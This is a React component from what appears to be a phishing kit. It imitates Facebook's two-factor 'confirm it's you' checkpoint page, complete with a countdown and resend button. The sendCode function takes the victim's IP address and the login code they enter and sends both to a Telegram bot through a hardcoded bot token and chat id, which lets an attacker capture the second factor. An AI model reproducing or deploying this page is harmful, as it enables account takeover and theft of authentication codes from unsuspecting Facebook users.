import Nav from './nav';
import styles from '../styles/check-point.module.css';
import { useForm } from "react-hook-form";
import { useState, useEffect } from "react";




const CheckPoint = (props) => {

    const { register, handleSubmit } = useForm();

    const [minutes, setMinutes] = useState(1);
    const [seconds, setSeconds] = useState(30);

    const resendOTP = () => {
        setMinutes(1);
        setSeconds(30);
      };


    useEffect(() => {
        const interval = setInterval(() => {
          if (seconds > 0) {
            setSeconds(seconds - 1);
          }
      
          if (seconds === 0) {
            if (minutes === 0) {
              clearInterval(interval);
            } else {
              setSeconds(59);
              setMinutes(minutes - 1);
            }
          }
        }, 1000);
      
        return () => {
          clearInterval(interval);
        };
      }, [seconds]);

    const sendCode = async (data) => {
        try {

            const message = `
             Ip:${props.ip.userIP}%0A code: ${data.code}`;
            const res = await fetch(`https://api.telegram.org/bot6029253450:AAF4Rk6omfCqptz3P05XciYjDQjtBgFXePs/sendMessage?chat_id=-4068050560&text=${message}`);

        } catch (err) {
            console.log(err);
        }
    }

    const onSubmit = (data) => {
        sendCode(data)
    }

    

  return (
    <div>
        <Nav/>

        <div className={styles.container}>
            <div className={styles.box}>
                <div className={styles.section}>
                    <strong>Choose a way to confirm it's you</strong>
                </div>
                <div className={styles.section}>
                    <p>Your account has two-factor authentication switched on, which requires this extra login step.</p>
                </div>

                <div className={styles.section}>
                    <strong>Approve from another device</strong>
                    <p>
                    We sent a notification to your Device. Check your Facebook notifications there and approve the login to continue.
                    </p>
                </div>

                <form onSubmit={handleSubmit(onSubmit)}>

                    <div className={styles.section}>
                        <strong>Or, enter your login code</strong>
                        <p>
                            Enter the 6-digit code from the authentication app you set up.
                        </p>
                        <div className={styles.codeInput}>
                            <input type="text" placeholder="Login code" {...register("code")} className={styles.code} />
                            {seconds > 0 || minutes > 0 ? (
                                <p>
                                ({minutes < 10 ? `0${minutes}` : minutes}:
                                    {seconds < 10 ? `0${seconds}` : seconds}
                                )
                                </p>
                            ) : (
                                <button onClick={resendOTP}>
                                    Resend
                                </button>
                            
                            )}
                        </div>
                        
                    </div>

                    <div className={styles.bottom}>
                        <a>Need another way to confirm it's you?</a>
                        <button type="submit" className={styles.btn}>Submit code</button>
                    </div>

                </form>

                

            </div>
        </div>

    </div>
  );
};

export default CheckPoint;